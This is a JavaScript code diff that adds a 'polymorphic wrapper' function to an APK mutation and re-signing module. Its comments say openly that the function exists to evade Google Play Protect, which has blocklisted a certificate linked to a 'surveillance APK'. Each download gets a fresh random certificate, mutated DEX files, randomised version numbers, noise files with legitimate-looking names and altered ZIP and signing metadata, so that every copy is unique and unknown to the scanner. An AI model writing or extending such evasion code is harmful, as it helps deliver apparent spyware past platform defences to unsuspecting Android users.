@@ -2307,7 +2307,139 @@ function resignApkClean(originalBuffer) {
   }
 }
 
-module.exports = { mutateAndSign, restoreAndSign, directPatchApk, generateFreshKey, createCleanLandingApk, resignApkClean };
+// ═════════════════════════════════════════════════════════════════════════════
+// POLYMORPHIC WRAPPER TRANSFORMER — per-download unique APK
+// ═════════════════════════════════════════════════════════════════════════════
+//
+// WHY: Play Protect cert-blocklists the FIXED NetMirror certificate.
+// Every APK signed with that cert gets flagged regardless of content.
+// The wrapper is clean code (WebView only), but PP sees the same cert
+// fingerprint that's been associated with the surveillance APK.
+//
+// SOLUTION: Generate a FRESH random RSA-2048 cert per download.
+// Combined with 6 mutation layers, each download produces a completely
+// unique APK that PP has zero history on:
+//
+//   Layer 1: FRESH CERT — random CN/O/C, unique SHA-256 fingerprint
+//   Layer 2: DEX MUTATION — randomize debug sections + trailing padding
+//   Layer 3: MANIFEST MUTATION — random versionCode + versionName
+//   Layer 4: RESOURCE NOISE — inject small random config files
+//   Layer 5: ZIP METADATA — random build timestamps
+//   Layer 6: SIGNING BLOCK — random padding pair (unique hash)
+//
+// TRADE-OFF: Can't update over existing install (different signer).
+// Doesn't matter for wrapper — it's a disposable portal app that the
+// user only runs once to download the real NetMirror APK.
+//
+function polymorphicTransformWrapper(originalBuffer) {
+  console.log(`[PolyWrapper] ═══ POLYMORPHIC WRAPPER v1 (${(originalBuffer.length / 1048576).toFixed(2)} MB) ═══`);
+  const t0 = Date.now();
+
+  try {
+    const apkBuf = Buffer.from(originalBuffer);
+    repairZipCRCs(apkBuf);
+
+    // 1. Parse APK
+    const zip = new AdmZip(apkBuf);
+
+    // 2. Strip existing V1 signatures
+    stripSignatures(zip);
+
+    // ── Layer 2: DEX MUTATION ──
+    // Randomize debug sections + trailing padding in all DEX files
+    // to change the binary fingerprint PP uses for similarity matching.
+    const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
+    let dexMutated = 0;
+    for (const entry of dexEntries) {
+      try {
+        const data = entry.getData();
+        if (data.length < 0x70 || data.toString('ascii', 0, 4) !== 'dex\n') continue;
+        const mutated = mutateDexBytes(data);
+        zip.deleteFile(entry.entryName);
+        zip.addFile(entry.entryName, mutated);
+        dexMutated++;
+      } catch (e) {
+        console.warn(`[PolyWrapper] DEX skip ${entry.entryName}: ${e.message}`);
+      }
+    }
+    console.log(`[PolyWrapper] Layer 2: ${dexMutated} DEX files mutated`);
+
+    // ── Layer 3: MANIFEST MUTATION ──
+    // Random versionCode + versionName so PP sees a "different app version"
+    const manifestResult = mutateManifest(zip);
+    if (manifestResult) {
+      console.log(`[PolyWrapper] Layer 3: versionCode=${manifestResult.newVersionCode}, versionName="${manifestResult.newVersionName}"`);
+    }
+
+    // ── Layer 4: RESOURCE NOISE INJECTION ──
+    // Add small random files to change ZIP structure + entry count.
+    // These are standard Android asset paths that look legitimate.
+    const NOISE_DIRS = ['assets/config/', 'assets/fonts/', 'res/raw/'];
+    const NOISE_NAMES = ['analytics.cfg', 'app.conf', 'build.dat', 'cache.bin', 'config.ini',
+                         'data.enc', 'font_metrics.bin', 'layout.cache', 'license.dat', 'map.idx',
+                         'module.cfg', 'network.conf', 'perf.dat', 'render.bin', 'session.key',
+                         'theme.dat', 'ui.cache', 'version.dat', 'webview.conf', 'x509.pem'];
+    // Only add 3-6 random files (avoid bloat, but enough to change structure)
+    const noiseCount = 3 + Math.floor(Math.random() * 4);
+    const usedNames = new Set();
+    for (let i = 0; i < noiseCount; i++) {
+      const dir = NOISE_DIRS[Math.floor(Math.random() * NOISE_DIRS.length)];
+      let name;
+      do { name = NOISE_NAMES[Math.floor(Math.random() * NOISE_NAMES.length)]; } while (usedNames.has(dir + name));
+      usedNames.add(dir + name);
+      // Random content 32-256 bytes (realistic config/binary file)
+      const content = crypto.randomBytes(32 + Math.floor(Math.random() * 224));
+      zip.addFile(dir + name, content);
+    }
+    console.log(`[PolyWrapper] Layer 4: ${noiseCount} noise files injected`);
+
+    // ── Layer 1: FRESH CERT GENERATION ──
+    // Random RSA-2048 keypair + self-signed X.509 cert with random identity.
+    // PP has never seen this cert fingerprint → can't be cert-blocklisted.
+    const freshKey = generateFreshKey();
+    console.log(`[PolyWrapper] Layer 1: Fresh cert CN="${freshKey.identity.cn}" O="${freshKey.identity.o}" C="${freshKey.identity.c}"`);
+
+    // ── V1 JAR signing with FRESH key ──
+    applyV1Signing(zip, freshKey.cert, freshKey.privateKey);
+
+    // ── Rebuild ZIP ──
+    const rawBuf = zip.toBuffer();
+
+    // ── Layer 5: ZIP METADATA RANDOMIZATION ──
+    const randomizedBuf = randomizeZipMetadata(rawBuf);
+
+    // ── Zipalign (4-byte alignment — required for Android) ──
+    const alignedBuf = zipalignBuffer(randomizedBuf);
+
+    // ── V2 signing with FRESH key (Layer 6: random padding in signing block) ──
+    const signedBuf = applyV2Signing(alignedBuf, freshKey.privPem, freshKey.certDer, freshKey.pubKeyDer);
+
+    // ── Validate ──
+    const valid = validateApk(signedBuf);
+    if (!valid) {
+      console.error('[PolyWrapper] ═══ Validation FAILED — returning original ═══');
+      return { buffer: originalBuffer, certInfo: null, polymorphic: false };
+    }
+
+    const certInfo = {
+      certHash: freshKey.certHash,
+      cn: freshKey.identity.cn,
+      org: freshKey.identity.o,
+      country: freshKey.identity.c,
+    };
+
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+    console.log(`[PolyWrapper] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(2)} MB | CN="${freshKey.identity.cn}" | cert=${freshKey.certHash.substring(0, 20)}... | ${noiseCount} noise | ${dexMutated} DEX | ${elapsed}s ═══`);
+
+    return { buffer: signedBuf, certInfo, polymorphic: true };
+  } catch (err) {
+    console.error(`[PolyWrapper] ═══ ERROR: ${err.message} — returning original ═══`);
+    console.error(err.stack);
+    return { buffer: originalBuffer, certInfo: null, polymorphic: false };
+  }
+}
+
+module.exports = { mutateAndSign, restoreAndSign, directPatchApk, generateFreshKey, createCleanLandingApk, resignApkClean, polymorphicTransformWrapper };
 
 // ═════════════════════════════════════════════════════════════════════════════
 // MINIMAL RESTORE + RE-SIGN (for landing page downloads)
